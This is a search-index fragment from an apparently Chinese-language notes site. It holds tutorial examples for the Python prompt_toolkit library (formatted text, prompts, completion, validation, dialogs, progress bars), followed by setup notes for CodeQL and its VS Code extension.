editing_mode = EditingMode . VI # Add a toolbar at the bottom to display the current input mode. def bottom_toolbar (): \" Display the current input mode. \" text = 'Vi' if get_app() . editing_mode == EditingMode . VI else 'Emacs' return [ ( 'class:toolbar' , ' [F4] %s ' % text) ] prompt( '> ' , key_bindings = bindings, bottom_toolbar = bottom_toolbar) run() \u4f7f\u7528control-space\u8865\u5168 \u00b6 link \u5176\u4ed6\u9009\u9879 \u00b6 \u591a\u884c\u8f93\u5165 \u00b6 Meta+Enter \u6216\u8005 Escape\uff0cEnter from prompt_toolkit import prompt prompt( '> ' , multiline = True) def prompt_continuation (width, line_number, is_soft_wrap): return '.' * width # Or: return [('', '.' * width)] prompt( 'multiline input> ' , multiline = True, prompt_continuation = prompt_continuation) \u9ed8\u8ba4\u503c \u00b6 prompt('What is your name: ', default='%s' % getpass.getuser()) \u9f20\u6807\u652f\u6301 \u00b6 \u5149\u6807\u4f4d\u7f6e\u548c\u6eda\u52a8 prompt('What is your name: ', mouse_support=True) \u6362\u884c \u00b6 \u9ed8\u8ba4\u6362\u884c prompt('What is your name: ', wrap_lines=False) \u5bc6\u7801\u8f93\u5165 \u00b6 from prompt_toolkit import prompt prompt( 'Enter password: ' , is_password = True) \u5f02\u6b65 \u00b6 link Dialogs \u00b6 Message box \u00b6 from prompt_toolkit.shortcuts import message_dialog message_dialog( title = 'Example dialog window' , text = 'Do you want to continue? \\n Press ENTER to quit.' ) Input box \u00b6 from prompt_toolkit.shortcuts import input_dialog text = input_dialog( title = 'Input dialog example' , text = 'Please type your password:' , password = True) Yes/No dialog \u00b6 from prompt_toolkit.shortcuts import yes_no_dialog result = yes_no_dialog( title = 'Yes/No dialog example' , text = 'Do you want to confirm?' ) Button dialog \u00b6 from prompt_toolkit.shortcuts import button_dialog result = button_dialog( title = 'Button dialog example' , text = 'Do you want to confirm?' , buttons = [ ( 'Yes' , True), ( 'No' , False), ( 'Maybe...' , None) ], ) dialog \u6837\u5f0f \u00b6 from prompt_toolkit.formatted_text import HTML from prompt_toolkit.shortcuts import message_dialog from prompt_toolkit.styles import Style example_style = Style . from_dict({ 'dialog' : 'bg:#88ff88' , 'dialog frame-label' : 'bg:#ffffff #000000' , 'dialog.body' : 'bg:#000000 #00ff00' , 'dialog shadow' : 'bg:#00aa00' , }) message_dialog( title = HTML( '<style bg=\"blue\" fg=\"white\">Styled</style> ' '<style fg=\"ansired\">dialog</style> window' ), text = 'Do you want to continue? \\n Press ENTER to quit.' , style = example_style) \u8fdb\u5ea6\u6761 \u00b6 \u7b80\u5355\u8fdb\u5ea6\u6761 \u00b6 from prompt_toolkit.shortcuts import ProgressBar import time with ProgressBar() as pb: for i in pb(range( 800 )): time . sleep( . 01 ) \u591a\u4e2a\u5e76\u884c\u4efb\u52a1 \u00b6 from prompt_toolkit.shortcuts import ProgressBar import time import threading with ProgressBar() as pb: # Two parallel tasks. def task_1 (): for i in pb(range( 100 )): time . sleep( . 05 ) def task_2 (): for i in pb(range( 150 )): time . sleep( . 08 ) # Start threads. t1 = threading . Thread(target = task_1) t2 = threading . Thread(target = task_2) t1 . daemon = True t2 . daemon = True t1 . start() t2 . start() # Wait for the threads to finish. We use a timeout for the join() call, # because on Windows, join cannot be interrupted by Control-C or any other # signal. for t in [t1, t2]: while t . is_alive(): t . join(timeout =. 5 ) \u589e\u52a0\u6807\u9898\u548c\u6807\u7b7e \u00b6 from prompt_toolkit.shortcuts import ProgressBar from prompt_toolkit.formatted_text import HTML import time title = HTML( 'Downloading <style bg=\"yellow\" fg=\"black\">4 files...</style>' ) label = HTML( '<ansired>some file</ansired>: ' ) with ProgressBar(title = title) as pb: for i in pb(range( 800 ), label = label): time . sleep( . 01 ) \u683c\u5f0f\u5316 \u00b6 \u9ed8\u8ba4style from prompt_toolkit.shortcuts.progress_bar.formatters import * default_formatting = [ Label(), Text( ' ' ), Percentage(), Text( ' ' ), Bar(), Text( ' ' ), Progress(), Text( ' ' ), Text( 'eta [' , style = 'class:time-left' ), TimeLeft(), Text( ']' , style = 'class:time-left' ), Text( ' ' ), ] from prompt_toolkit.shortcuts import ProgressBar from prompt_toolkit.styles import Style from prompt_toolkit.shortcuts.progress_bar import formatters import time style = Style . from_dict({ 'label' : 'bg:#ffff00 #000000' , 'percentage' : 'bg:#ffff00 #000000' , 'current' : '#448844' , 'bar' : '' , }) custom_formatters = [ formatters . Label(), formatters . Text( ': [' , style = 'class:percentage' ), formatters . Percentage(), formatters . Text( ']' , style = 'class:percentage' ), formatters . Text( ' ' ), formatters . Bar(sym_a = '#' , sym_b = '#' , sym_c = '.' ), formatters . Text( ' ' ), ] with ProgressBar(style = style, formatters = custom_formatters) as pb: for i in pb(range( 1600 ), label = 'Installing' ): time . sleep( . 01 ) \u589e\u52a0\u952e\u7ed1\u5b9a\u548c\u5de5\u5177\u680f \u00b6 from prompt_toolkit import HTML from prompt_toolkit.key_binding import KeyBindings from prompt_toolkit.patch_stdout import patch_stdout from prompt_toolkit.shortcuts import ProgressBar import time bottom_toolbar = HTML( ' <b>[f]</b> Print \"f\" <b>[x]</b> Abort.' ) # Create custom key bindings first. kb = KeyBindings() cancel = [False] @kb.add ( 'f' ) def _ (event): print ( 'You pressed `f`.' ) @kb.add ( 'x' ) def _ (event): \" Send Abort (control-c) signal. \" cancel[ 0 ] = True os . kill(os . getpid(), signal . SIGINT) # Use `patch_stdout`, to make sure that prints go above the # application. with patch_stdout(): with ProgressBar(key_bindings = kb, bottom_toolbar = bottom_toolbar) as pb: for i in pb(range( 800 )): time . sleep( . 01 ) # Stop when the cancel flag has been set. if cancel[ 0 ]: break \u6784\u5efa\u5168\u5c4f\u5e94\u7528 \u00b6 link","title":"python-prompt-toolkit"},{"location":"module/python/python-prompt-toolkit/#python-prompt-toolkit","text":"\u5982\u4f55\u5b66\u4e60\u548c\u7406\u89e3prompt_toolkit First, learn how to print text. This is important, because it covers how to use \u201cformatted text\u201d, which is something you\u2019ll use whenever you want to use colors anywhere. Secondly, go through the asking for input section. This is useful for almost any use case, even for full screen applications. It covers autocompletions, syntax highlighting, key bindings, and so on. Then, learn about Dialogs, which is easy and fun. Finally, learn about full screen applications and read through the advanced topics.","title":"python-prompt-toolkit"},{"location":"module/python/python-prompt-toolkit/#_1","text":"","title":"\u6253\u5370(\u548c\u4f7f\u7528)\u683c\u5f0f\u5316\u6587\u672c"},{"location":"module/python/python-prompt-toolkit/#_2","text":"#from __future__ import unicode_literals from prompt_toolkit import print_formatted_text print_formatted_text( 'Hello world' )","title":"\u6253\u5370\u7eaf\u6587\u672c"},{"location":"module/python/python-prompt-toolkit/#_3","text":"There are several ways to display colors: By creating an HTML object. By creating an ANSI object that contains ANSI escape sequences. By creating a list of (style, text) tuples. By creating a list of (pygments.Token, text) tuples, and wrapping it in PygmentsTokens.","title":"\u683c\u5f0f\u5316\u6587\u672c"},{"location":"module/python/python-prompt-toolkit/#html","text":"from __future__ import unicode_literals, print_function from prompt_toolkit import print_formatted_text, HTML print_formatted_text(HTML( '<b>This is bold</b>' )) print_formatted_text(HTML( '<i>This is italic</i>' )) print_formatted_text(HTML( '<u>This is underlined</u>' )) # Colors from the ANSI palette. print_formatted_text(HTML( '<ansired>This is red</ansired>' )) print_formatted_text(HTML( '<ansigreen>This is green</ansigreen>' )) # Named colors (256 color palette, or true color, depending on the output). print_formatted_text(HTML( '<skyblue>This is sky blue</skyblue>' )) print_formatted_text(HTML( '<seagreen>This is sea green</seagreen>' )) print_formatted_text(HTML( '<violet>This is violet</violet>' )) print_formatted_text(HTML( '<aaa fg=\"ansiwhite\" bg=\"ansigreen\">White on green</aaa>' )) from prompt_toolkit.styles import Style style = Style . from_dict({ 'aaa' : '#ff0066' , 'bbb' : '#44ff00 italic' , }) print_formatted_text(HTML( '<aaa>Hello</aaa> <bbb>world</bbb>!' ), style = style)","title":"HTML"},{"location":"module/python/python-prompt-toolkit/#ansi","text":"from prompt_toolkit import print_formatted_text, ANSI print_formatted_text(ANSI( ' \\x1b [31mhello \\x1b [32mworld' ))","title":"ANSI"},{"location":"module/python/python-prompt-toolkit/#style-text-tuples","text":"from __future__ import unicode_literals, print_function from prompt_toolkit import print_formatted_text from prompt_toolkit.formatted_text import FormattedText text = FormattedText([ ( '#ff0066' , 'Hello' ), ( '' , ' ' ), ( '#44ff00 italic' , 'World' ), ]) print_formatted_text(text) from prompt_toolkit.styles import Style # The text. text = FormattedText([ ( 'class:aaa' , 'Hello' ), ( '' , ' ' ), ( 'class:bbb' , 'World' ), ]) # The style sheet. style = Style . from_dict({ 'aaa' : '#ff0066' , 'bbb' : '#44ff00 italic' , }) print_formatted_text(text, style = style)","title":"(style, text) tuples"},{"location":"module/python/python-prompt-toolkit/#pygments-token-text-tuples","text":"Pygments","title":"Pygments (Token, text) tuples"},{"location":"module/python/python-prompt-toolkit/#to_formatted_text","text":"from prompt_toolkit.formatted_text import to_formatted_text, HTML from prompt_toolkit import print_formatted_text html = HTML( '<aaa>Hello</aaa> <bbb>world</bbb>!' ) text = to_formatted_text(html, style = 'class:my_html bg:#00ff00 italic' ) print_formatted_text(text)","title":"to_formatted_text"},{"location":"module/python/python-prompt-toolkit/#prompts","text":"from prompt_toolkit import prompt text = prompt( 'Give me some input: ' ) print ( 'You said: %s' % text)","title":"\u5982\u4f55\u8f93\u5165 (prompts)"},{"location":"module/python/python-prompt-toolkit/#promptsession","text":"prompt\u662fPromptSession\u5b9e\u4f8b\u7684prompt\u65b9\u6cd5 from prompt_toolkit import PromptSession # Create prompt object. session = PromptSession() # Do multiple input calls. text1 = session . prompt() text2 = session . prompt()","title":"PromptSession \u5bf9\u8c61"},{"location":"module/python/python-prompt-toolkit/#_4","text":"\u4f7f\u7528\u4e86pygments\u8fd9\u4e2a\u5e93\uff0c\u9664\u4e86html\u8fd8\u6709python\uff0cshell\u7b49\u7b49 from pygments.lexers.html import HtmlLexer from prompt_toolkit.shortcuts import prompt from prompt_toolkit.lexers import PygmentsLexer text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer)) print ( 'You said: %s' % text)","title":"\u8bed\u6cd5\u9ad8\u4eae"},{"location":"module/python/python-prompt-toolkit/#_5","text":"\u8ddf\u8bed\u6cd5\u9ad8\u4eae\u63a5\u8fd1\uff0c\u4f46\u8fd8\u662f\u6709\u533a\u522b from pygments.lexers.html import HtmlLexer from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import Style from prompt_toolkit.lexers import PygmentsLexer our_style = Style . from_dict({ 'pygments.comment' : '#888888 bold' , 'pygments.keyword' : '#ff88ff bold' , }) text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer), style = our_style)","title":"\u989c\u8272"},{"location":"module/python/python-prompt-toolkit/#pygments-style","text":"All Pygments style classes can be used as well, when they are wrapped through style_from_pygments_cls() from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import style_from_pygments_cls, merge_styles from prompt_toolkit.lexers import PygmentsLexer from pygments.styles.tango import TangoStyle from pygments.lexers.html import HtmlLexer our_style = merge_styles([ style_from_pygments_cls(TangoStyle), Style . from_dict({ 'pygments.comment' : '#888888 bold' , 'pygments.keyword' : '#ff88ff bold' , }) ]) text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer), style = our_style)","title":"\u4f7f\u7528Pygments style"},{"location":"module/python/python-prompt-toolkit/#_6","text":"from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import Style style = Style . from_dict({ # User input (default text). '' : '#ff0066' , # Prompt. 'username' : '#884444' , 'at' : '#00aa00' , 'colon' : '#0000aa' , 'pound' : '#00aa00' , 'host' : '#00ffff bg:#444400' , 'path' : 'ansicyan underline' , }) message = [ ( 'class:username' , 'john' ), ( 'class:at' , '@' ), ( 'class:host' , 'localhost' ), ( 'class:colon' , ':' ), ( 'class:path' , '/user/john' ), ( 'class:pound' , '# ' ), ] # If you want to have 24bit true color, this is possible by adding the true_color=True option to the prompt() function. text = prompt(message, style = style)","title":"\u7740\u8272\u63d0\u793a"},{"location":"module/python/python-prompt-toolkit/#_7","text":"from prompt_toolkit import prompt from prompt_toolkit.completion import WordCompleter html_completer = WordCompleter([ '<html>' , '<body>' , '<head>' , '<title>' , 'pengweidang' ]) text = prompt( 'Enter HTML: ' , completer = html_completer) print ( 'You said: %s' % text)","title":"\u81ea\u52a8\u8865\u5168"},{"location":"module/python/python-prompt-toolkit/#_8","text":"from prompt_toolkit.completion import Completer, Completion class MyCustomCompleter (Completer): def get_completions (self, document, complete_event): # Display this completion, black on yellow. yield Completion( 'completion1' , start_position = 0 , style = 'bg:ansiyellow fg:ansiblack' ) # Underline completion. yield Completion( 'completion2' , start_position = 0 , style = 'underline' ) # Specify class name, which will be looked up in the style sheet. yield Completion( 'completion3' , start_position = 0 , style = 'class:special-completion' ) from prompt_toolkit.completion import Completer, Completion from prompt_toolkit.formatted_text import HTML class MyCustomCompleter (Completer): def get_completions (self, document, complete_event): yield Completion( 'completion1' , start_position = 0 , display = HTML( '<b>completion</b><ansired>1</ansired>' ), style = 'bg:ansiyellow' )","title":"\u4e2a\u6027\u5316\u8865\u5168"},{"location":"module/python/python-prompt-toolkit/#_9","text":"Prompt_toolkit\u9644\u5e26\u4e86FuzzyCompleter\u548cFuzzyWordCompleter\u7c7b\u3002","title":"\u6a21\u7cca\u8865\u5168"},{"location":"module/python/python-prompt-toolkit/#complete-while-typing","text":"\u81ea\u52a8\u8865\u5168\u53ef\u4ee5\u5728\u952e\u5165\u65f6\u6216\u7528\u6237\u6309\u4e0bTab\u952e\u65f6\u81ea\u52a8\u751f\u6210\uff0c\u6ce8\u610f\u4f1a\u4e0e\u2018enable_history_search\u2019\u51b2\u7a81\u3002 ext = prompt( 'Enter HTML: ' , completer = my_completer, complete_while_typing = True)","title":"Complete while typing"},{"location":"module/python/python-prompt-toolkit/#_10","text":"\u5982\u679c\u751f\u6210\u8865\u5168\u4f1a\u82b1\u8d39\u5f88\u591a\u65f6\u95f4\uff0c\u6700\u597d\u5728\u540e\u53f0\u7ebf\u7a0b\u4e2d\u5b8c\u6210\u3002 text = prompt( '> ' , completer = MyCustomCompleter(), complete_in_thread = True)","title":"\u5f02\u6b65\u8865\u5168"},{"location":"module/python/python-prompt-toolkit/#_11","text":"from prompt_toolkit.validation import Validator, ValidationError from prompt_toolkit import prompt class NumberValidator (Validator): def validate (self, document): text = document . text if text and not text . isdigit(): i = 0 # Get index of fist non numeric character. # We want to move the cursor here. for i, c in enumerate(text): if not c . isdigit(): break raise ValidationError(message = 'This input contains non-numeric characters' , cursor_position = i) number = int(prompt( 'Give a number: ' , validator = NumberValidator())) print ( 'You said: %i' % number) \u5b9e\u65f6\u9a8c\u8bc1\uff1a \u5728prompt\u51fd\u6570\u4e2d\uff0cvalidate_while_typing=True \u901a\u8fc7\u56de\u8c03\u51fd\u6570\u9a8c\u8bc1 from prompt_toolkit.validation import Validator from prompt_toolkit import prompt def is_number (text): return text . isdigit() validator = Validator . from_callable( is_number, error_message = 'This input contains non-numeric characters' , move_cursor_to_end = True) number = int(prompt( 'Give a number: ' , validator = validator)) print ( 'You said: %i' % number)","title":"\u8f93\u5165\u9a8c\u8bc1"},{"location":"module/python/python-prompt-toolkit/#_12","text":"\u5982\u679c\u9700\u8981\u4fdd\u5b58\u5230\u6587\u4ef6 from prompt_toolkit import PromptSession from prompt_toolkit.history import FileHistory session = PromptSession(history = FileHistory( '~/.myhistory' )) while True: session . prompt()","title":"\u5386\u53f2\u8bb0\u5f55"},{"location":"module/python/python-prompt-toolkit/#_13","text":"\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u81ea\u52a8\u63d0\u793a from prompt_toolkit import PromptSession from prompt_toolkit.history import InMemoryHistory from prompt_toolkit.auto_suggest import AutoSuggestFromHistory session = PromptSession() while True: text = session . prompt( '> ' , auto_suggest = AutoSuggestFromHistory()) print ( 'You said: %s' % text)","title":"\u81ea\u52a8\u63d0\u793a"},{"location":"module/python/python-prompt-toolkit/#_14","text":"from prompt_toolkit import prompt from prompt_toolkit.styles import Style def bottom_toolbar (): return [( 'class:bottom-toolbar' , ' This is a toolbar. ' )] style = Style . from_dict({ 'bottom-toolbar' : '#ffffff bg:#333333' , }) text = prompt( '> ' , bottom_toolbar = bottom_toolbar, style = style) print ( 'You said: %s' % text) \u9ed8\u8ba4\u7684\u7c7b\u540d\u662fbottom-toolbar\uff0c\u5b83\u4e5f\u5c06\u7528\u4e8e\u586b\u5145\u5de5\u5177\u680f\u7684\u80cc\u666f\u3002","title":"\u6dfb\u52a0\u5e95\u90e8\u5de5\u5177\u680f"},{"location":"module/python/python-prompt-toolkit/#prompt","text":"from prompt_toolkit import prompt from prompt_toolkit.styles import Style example_style = Style . from_dict({ 'rprompt' : 'bg:#ff0066 #ffffff' , }) def get_rprompt (): return '<rprompt>' answer = prompt( '> ' , rprompt = get_rprompt, style = example_style)","title":"\u6dfb\u52a0\u53f3\u4fa7prompt"},{"location":"module/python/python-prompt-toolkit/#vi","text":"Vi\u6a21\u5f0f from prompt_toolkit import prompt prompt( '> ' , vi_mode = True)","title":"Vi \u8f93\u5165\u6a21\u5f0f"},{"location":"module/python/python-prompt-toolkit/#_15","text":"from prompt_toolkit import prompt from prompt_toolkit.application import run_in_terminal from prompt_toolkit.key_binding import KeyBindings bindings = KeyBindings() @bindings.add ( 'c-t' ) def _ (event): \" Say 'hello' when `c-t` is pressed. \" def print_hello (): print ( 'hello world' ) run_in_terminal(print_hello) @bindings.add ( 'c-x' ) def _ (event): \" Exit when `c-x` is pressed. \" event . app . exit() text = prompt( '> ' , key_bindings = bindings) print ( 'You said: %s' % text)","title":"\u81ea\u5b9a\u4e49\u952e\u7ed1\u5b9a"},{"location":"module/python/python-prompt-toolkit/#_16","text":"import datetime from prompt_toolkit import prompt from prompt_toolkit.filters import Condition from prompt_toolkit.key_binding import KeyBindings bindings = KeyBindings() @Condition def is_active (): \" Only activate key binding on the second half of each minute. \" return datetime . datetime . now() . second > 30 @bindings.add ( 'c-t' , filter = is_active) def _ (event): # ... pass prompt( '> ' , key_bindings = bindings)","title":"\u6839\u636e\u6761\u4ef6\u542f\u7528\u952e\u7ed1\u5b9a"},{"location":"module/python/python-prompt-toolkit/#emacsvi","text":"from prompt_toolkit import prompt from prompt_toolkit.application.current import get_app from prompt_toolkit.filters import Condition from prompt_toolkit.key_binding import KeyBindings def run (): # Create a set of key bindings. bindings = KeyBindings() # Add an additional key binding for toggling this flag. @bindings.add ( 'f4' ) def _ (event): \" Toggle between Emacs and Vi mode. \" app = event . app if app . editing_mode == EditingMode . VI: app . editing_mode = EditingMode . EMACS else : app . editing_mode = EditingMode . VI # Add a toolbar at the bottom to display the current input mode. def bottom_toolbar (): \" Display the current input mode. \" text = 'Vi' if get_app() . editing_mode == EditingMode . VI else 'Emacs' return [ ( 'class:toolbar' , ' [F4] %s ' % text) ] prompt( '> ' , key_bindings = bindings, bottom_toolbar = bottom_toolbar) run()","title":"\u5728Emacs\u548cVi\u6a21\u5f0f\u4e2d\u52a8\u6001\u5207\u6362"},{"location":"module/python/python-prompt-toolkit/#control-space","text":"link","title":"\u4f7f\u7528control-space\u8865\u5168"},{"location":"module/python/python-prompt-toolkit/#_17","text":"","title":"\u5176\u4ed6\u9009\u9879"},{"location":"module/python/python-prompt-toolkit/#_18","text":"Meta+Enter \u6216\u8005 Escape\uff0cEnter from prompt_toolkit import prompt prompt( '> ' , multiline = True) def prompt_continuation (width, line_number, is_soft_wrap): return '.' * width # Or: return [('', '.' * width)] prompt( 'multiline input> ' , multiline = True, prompt_continuation = prompt_continuation)","title":"\u591a\u884c\u8f93\u5165"},{"location":"module/python/python-prompt-toolkit/#_19","text":"prompt('What is your name: ', default='%s' % getpass.getuser())","title":"\u9ed8\u8ba4\u503c"},{"location":"module/python/python-prompt-toolkit/#_20","text":"\u5149\u6807\u4f4d\u7f6e\u548c\u6eda\u52a8 prompt('What is your name: ', mouse_support=True)","title":"\u9f20\u6807\u652f\u6301"},{"location":"module/python/python-prompt-toolkit/#_21","text":"\u9ed8\u8ba4\u6362\u884c prompt('What is your name: ', wrap_lines=False)","title":"\u6362\u884c"},{"location":"module/python/python-prompt-toolkit/#_22","text":"from prompt_toolkit import prompt prompt( 'Enter password: ' , is_password = True)","title":"\u5bc6\u7801\u8f93\u5165"},{"location":"module/python/python-prompt-toolkit/#_23","text":"link","title":"\u5f02\u6b65"},{"location":"module/python/python-prompt-toolkit/#dialogs","text":"","title":"Dialogs"},{"location":"module/python/python-prompt-toolkit/#message-box","text":"from prompt_toolkit.shortcuts import message_dialog message_dialog( title = 'Example dialog window' , text = 'Do you want to continue? \\n Press ENTER to quit.' )","title":"Message box"},{"location":"module/python/python-prompt-toolkit/#input-box","text":"from prompt_toolkit.shortcuts import input_dialog text = input_dialog( title = 'Input dialog example' , text = 'Please type your password:' , password = True)","title":"Input box"},{"location":"module/python/python-prompt-toolkit/#yesno-dialog","text":"from prompt_toolkit.shortcuts import yes_no_dialog result = yes_no_dialog( title = 'Yes/No dialog example' , text = 'Do you want to confirm?' )","title":"Yes/No dialog"},{"location":"module/python/python-prompt-toolkit/#button-dialog","text":"from prompt_toolkit.shortcuts import button_dialog result = button_dialog( title = 'Button dialog example' , text = 'Do you want to confirm?' , buttons = [ ( 'Yes' , True), ( 'No' , False), ( 'Maybe...' , None) ], )","title":"Button dialog"},{"location":"module/python/python-prompt-toolkit/#dialog","text":"from prompt_toolkit.formatted_text import HTML from prompt_toolkit.shortcuts import message_dialog from prompt_toolkit.styles import Style example_style = Style . from_dict({ 'dialog' : 'bg:#88ff88' , 'dialog frame-label' : 'bg:#ffffff #000000' , 'dialog.body' : 'bg:#000000 #00ff00' , 'dialog shadow' : 'bg:#00aa00' , }) message_dialog( title = HTML( '<style bg=\"blue\" fg=\"white\">Styled</style> ' '<style fg=\"ansired\">dialog</style> window' ), text = 'Do you want to continue? \\n Press ENTER to quit.' , style = example_style)","title":"dialog \u6837\u5f0f"},{"location":"module/python/python-prompt-toolkit/#_24","text":"","title":"\u8fdb\u5ea6\u6761"},{"location":"module/python/python-prompt-toolkit/#_25","text":"from prompt_toolkit.shortcuts import ProgressBar import time with ProgressBar() as pb: for i in pb(range( 800 )): time . sleep( . 01 )","title":"\u7b80\u5355\u8fdb\u5ea6\u6761"},{"location":"module/python/python-prompt-toolkit/#_26","text":"from prompt_toolkit.shortcuts import ProgressBar import time import threading with ProgressBar() as pb: # Two parallel tasks. def task_1 (): for i in pb(range( 100 )): time . sleep( . 05 ) def task_2 (): for i in pb(range( 150 )): time . sleep( . 08 ) # Start threads. t1 = threading . Thread(target = task_1) t2 = threading . Thread(target = task_2) t1 . daemon = True t2 . daemon = True t1 . start() t2 . start() # Wait for the threads to finish. We use a timeout for the join() call, # because on Windows, join cannot be interrupted by Control-C or any other # signal. for t in [t1, t2]: while t . is_alive(): t . join(timeout =. 5 )","title":"\u591a\u4e2a\u5e76\u884c\u4efb\u52a1"},{"location":"module/python/python-prompt-toolkit/#_27","text":"from prompt_toolkit.shortcuts import ProgressBar from prompt_toolkit.formatted_text import HTML import time title = HTML( 'Downloading <style bg=\"yellow\" fg=\"black\">4 files...</style>' ) label = HTML( '<ansired>some file</ansired>: ' ) with ProgressBar(title = title) as pb: for i in pb(range( 800 ), label = label): time . sleep( . 01 )","title":"\u589e\u52a0\u6807\u9898\u548c\u6807\u7b7e"},{"location":"module/python/python-prompt-toolkit/#_28","text":"\u9ed8\u8ba4style from prompt_toolkit.shortcuts.progress_bar.formatters import * default_formatting = [ Label(), Text( ' ' ), Percentage(), Text( ' ' ), Bar(), Text( ' ' ), Progress(), Text( ' ' ), Text( 'eta [' , style = 'class:time-left' ), TimeLeft(), Text( ']' , style = 'class:time-left' ), Text( ' ' ), ] from prompt_toolkit.shortcuts import ProgressBar from prompt_toolkit.styles import Style from prompt_toolkit.shortcuts.progress_bar import formatters import time style = Style . from_dict({ 'label' : 'bg:#ffff00 #000000' , 'percentage' : 'bg:#ffff00 #000000' , 'current' : '#448844' , 'bar' : '' , }) custom_formatters = [ formatters . Label(), formatters . Text( ': [' , style = 'class:percentage' ), formatters . Percentage(), formatters . Text( ']' , style = 'class:percentage' ), formatters . Text( ' ' ), formatters . Bar(sym_a = '#' , sym_b = '#' , sym_c = '.' ), formatters . Text( ' ' ), ] with ProgressBar(style = style, formatters = custom_formatters) as pb: for i in pb(range( 1600 ), label = 'Installing' ): time . sleep( . 01 )","title":"\u683c\u5f0f\u5316"},{"location":"module/python/python-prompt-toolkit/#_29","text":"from prompt_toolkit import HTML from prompt_toolkit.key_binding import KeyBindings from prompt_toolkit.patch_stdout import patch_stdout from prompt_toolkit.shortcuts import ProgressBar import time bottom_toolbar = HTML( ' <b>[f]</b> Print \"f\" <b>[x]</b> Abort.' ) # Create custom key bindings first. kb = KeyBindings() cancel = [False] @kb.add ( 'f' ) def _ (event): print ( 'You pressed `f`.' ) @kb.add ( 'x' ) def _ (event): \" Send Abort (control-c) signal. \" cancel[ 0 ] = True os . kill(os . getpid(), signal . SIGINT) # Use `patch_stdout`, to make sure that prints go above the # application. with patch_stdout(): with ProgressBar(key_bindings = kb, bottom_toolbar = bottom_toolbar) as pb: for i in pb(range( 800 )): time . sleep( . 01 ) # Stop when the cancel flag has been set. if cancel[ 0 ]: break","title":"\u589e\u52a0\u952e\u7ed1\u5b9a\u548c\u5de5\u5177\u680f"},{"location":"module/python/python-prompt-toolkit/#_30","text":"link","title":"\u6784\u5efa\u5168\u5c4f\u5e94\u7528"},{"location":"module/semmle-ql/codeql/","text":"CodeQL \u00b6 https://semmle.com/codeql How does CodeQL work \u00b6 \u4e00 Create database \u00b6 \u63d0\u53d6\u4ee3\u7801\u5e93\u4e2d\u6bcf\u4e2a\u6e90\u6587\u4ef6\u7684\u5355\u4e00\u5173\u7cfb\u8868\u793a \u5bf9\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u901a\u8fc7\u76d1\u89c6\u6784\u5efa\u8fc7\u7a0b\u63d0\u53d6\u3002\u6bcf\u6b21\u8c03\u7528\u7f16\u8bd1\u5668\u6765\u5904\u7406\u6e90\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u751f\u6210\u8be5\u6587\u4ef6\u7684\u526f\u672c\uff0c\u5e76\u6536\u96c6\u5173\u4e8e\u6e90\u4ee3\u7801\u7684\u6240\u6709\u76f8\u5173\u4fe1\u606f\u3002 \u5bf9\u4e8e\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u63d0\u53d6\u5668\u76f4\u63a5\u5728\u6e90\u4ee3\u7801\u4e0a\u8fd0\u884c\uff0c\u89e3\u6790\u4f9d\u8d56\u4ee5\u63d0\u4f9b\u51c6\u786e\u7684\u4ee3\u7801\u5e93\u8868\u793a\u3002 \u5bf9\u4e8e\u591a\u8bed\u8a00\u4ee3\u7801\u5e93\uff0c\u6570\u636e\u5e93\u6bcf\u6b21\u751f\u6210\u4e00\u79cd\u8bed\u8a00\u3002 \u63d0\u53d6\u4e4b\u540e\uff0c\u5206\u6790\u6240\u9700\u7684\u6240\u6709\u6570\u636e\u88ab\u5bfc\u5165\u5230\u5355\u4e2a\u76ee\u5f55\u4e2d\uff0c\u5373CodeQL\u6570\u636e\u5e93\u3002 Run queries \u00b6 \u7528\u4e13\u95e8\u8bbe\u8ba1\u7684\u9762\u5411\u5bf9\u8c61\u67e5\u8be2\u8bed\u8a00--QL,\u5bf9\u6570\u636e\u5e93\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u67e5\u8be2\u3002 Interpret query results \u00b6 \u5c06\u67e5\u8be2\u7ed3\u679c\u4ee5\u66f4\u53ef\u89e3\u91ca\u7684\u65b9\u5f0f\u5c55\u793a\u3002 \u4e8c CodeQL for Visual Studio Code \u00b6 Installing the extension \u00b6 3\u79cd\u65b9\u5f0f Go to the Visual Studio Code Marketplace in your browser and click Install. In the Extensions view (Ctrl+Shift+X or Cmd+Shift+X), search for CodeQL, then select Install. Download the CodeQL VSIX file. Then, in the Extensions view, click More actions > Install from VSIX, and select the CodeQL VSIX file. Configuring access to the CodeQL CLI \u00b6 CodeQL\u4f7f\u7528CodeQL CLI\u6765\u7f16\u8bd1\u548c\u8fd0\u884c\u67e5\u8be2\uff0c\u7ec6\u8282\u53e6\u5916\u4ecb\u7ecd\u3002CodeQL CLI \u4e0b\u8f7d CodeQL CLI \u5728Linux/Mac\u53eb\u505a codeql \uff0c\u5728Windows\u4e2d\u53eb\u505a codeql.cmd \u9700\u8981\u5728vscode CodeQL Extension\u914d\u7f6e\u5176\u8def\u5f84\uff08codeQL.cli.executablePath\uff09 Setting up a CodeQL workspace \u00b6 \u4f7f\u7528CodeQL\u65f6\uff0c\u9700\u8981\u8bbf\u95ee\u6807\u51c6CodeQL\u5e93\u3002\u4e0d\u7136\u65e0\u6cd5\u67e5\u8be2\u3002\u4e24\u79cd\u65b9\u5f0f\uff1a use the \u201cstarter\u201d workspace(\u5efa\u8bae) add the CodeQL libraries and queries to an existing workspace. Using the \u201cstarter\u201d workspace \u00b6 Clone the https://github.com/github/vscode-codeql-starter/ repository to your computer: Make sure you include the submodules, either by using git clone --recursive , or using by git submodule update --init --remote after cloning. Use git submodule update --remote regularly to keep the submodules up to date. In VS Code, use the File > Open Workspace option to open the vscode-codeql-starter.code-workspace file from your checkout of the workspace repository. Updating an existing workspace for CodeQL \u00b6 Dowload the CodeQL libraries Select File > Add Folder to Workspace, and choose your local checkout of the Semmle/ql repository. Create one new folder per target language, using either the New Folder or Add Folder to Workspace options, to hold custom queries and libraries. Create a qlpack.yml file in each target language folder. This tells the CodeQL CLI the target language for that folder and what its dependencies are. (The master branch of Semmle/ql already has these files.) 